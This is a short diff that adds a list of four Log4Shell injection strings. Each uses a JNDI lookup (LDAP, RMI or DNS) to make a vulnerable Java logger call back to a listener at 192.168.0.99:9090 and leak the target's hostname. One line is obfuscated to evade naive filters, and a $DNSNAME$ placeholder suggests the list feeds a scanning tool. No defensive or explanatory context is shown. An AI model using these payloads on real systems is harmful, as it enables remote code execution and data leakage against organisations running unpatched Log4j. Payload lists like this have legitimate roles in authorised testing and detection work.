@@ -1,0 +1,4 @@
+${jndi:ldap://$DNSNAME$--${hostname}.192.168.0.99:9090/a}
+${jndi:rmi://$DNSNAME$--${hostname}.192.168.0.99:9090/a}
+${jndi:dns://$DNSNAME$--${hostname}.192.168.0.99:9090}
+${${::-j}ndi:rmi://$DNSNAME$--${hostname}.192.168.0.99:9090/a}
